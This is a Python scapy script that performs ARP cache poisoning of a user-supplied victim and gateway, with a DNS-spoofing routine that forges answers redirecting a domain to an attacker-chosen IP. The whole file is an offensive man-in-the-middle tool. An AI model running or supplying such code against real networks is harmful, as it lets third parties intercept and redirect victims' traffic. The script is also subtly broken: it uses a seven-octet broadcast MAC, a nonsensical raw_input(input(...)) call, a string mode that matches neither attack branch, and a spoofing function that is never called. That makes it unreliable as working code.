import sys
import time
from scapy.all import Ether, ARP, IP, UDP, DNS, DNSQR, DNSRR, get_if_hwaddr, get_if_addr, sendp, srp

def getOwnMacIP(iface):
    ipOwn = get_if_addr(iface)
    macOwn = get_if_hwaddr(iface)
    return ipOwn, macOwn

def getMacAddress(ipAdd, iface):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff:ff")/ARP(pdst=ipAdd)
    ans, _ = srp(packet, iface=iface, timeout=2)
    if ans:
        return ans[0][1][ARP].hwsrc

def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof, iface):
    # Build ARP Packet
    arp = Ether()/ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macTarget
    arp[ARP].pdst = ipTarget

    # Send ARP Packet
    sendp(arp, iface=iface)

def spoofDNS(pkt):
    if pkt.haslayer(DNSQR):
        # Check if it's a DNS query
        victim_domain = "example.com"  # Modify this with the target domain
        spoofed_ip = "192.168.0.100"  # Modify this with the IP to redirect

        # Check if the queried domain matches the victim domain
        if pkt[DNSQR].qname.decode() == victim_domain:
            # Build DNS response
            dns_response = Ether()/IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/\
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qdcount=1, ancount=1,
                               qd=DNSQR(qname=pkt[DNSQR].qname),
                               an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip))

            # Send DNS response
            sendp(dns_response, iface=iface, verbose=0)

def attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode, iface):
    if opMode == 0:
        try:
            print("Initialised ARP Poisoning...")
            while True:
                sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, iface)
                sendPoisonPacket(ipAttacker, macAttacker, ipGateway, macGateway, ipVictim, iface)
                time.sleep(2)
        except KeyboardInterrupt:
            print("Stopped ARP Poisoning")
    elif opMode == 1:
        try:
            print("Initialised ARP Poisoning...")
            while True:
                sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, iface)
                time.sleep(2)
        except KeyboardInterrupt:
            print("Stopped ARP Poisoning")

# User input provides network interface, IP addresses
iface = raw_input("Enter Network Interface: ")
ipVictim = raw_input("Enter Victim IP: ")
ipGateway = raw_input("Enter Gateway IP: ")
opMode = raw_input(input("Enter Operational Mode (0: silent, 1: all out): "))

# Find IP and MAC addresses
ipAttacker, macAttacker = getOwnMacIP(iface)
macGateway = getMacAddress(ipGateway, iface)
macVictim = getMacAddress(ipVictim, iface)

# Send poison packets
attack(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, macGateway, opMode, iface)
